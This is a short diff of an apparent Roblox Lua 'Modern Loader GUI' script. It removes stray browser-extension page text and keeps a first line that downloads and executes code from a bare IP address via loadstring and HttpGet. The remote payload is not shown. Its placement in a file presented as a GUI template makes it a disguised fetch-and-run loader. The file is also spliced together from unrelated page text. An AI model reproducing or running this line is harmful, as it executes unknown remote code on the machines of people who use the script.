@@ -1,20 +1,4 @@
-question-ai-logo
-managemanage
-managemanage
-useruser
-fullfull
-closeclose
-Chat AI
-Hello! Is there any question I can help you with?
-Which iconic American landmark is located in South Dakota and features the faces of four U.S. presidents?
-What is the national bird of the United States?
-Ask AI
-Caution
-Refresh this page to activate the extension on this page.
-Refresh
-Feedback
-logo
-more
+
 loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
 --// Modern Loader GUI (Roblox Lua)
 --// Drop into a LocalScript (StarterPlayerScripts, StarterGui, etc.)
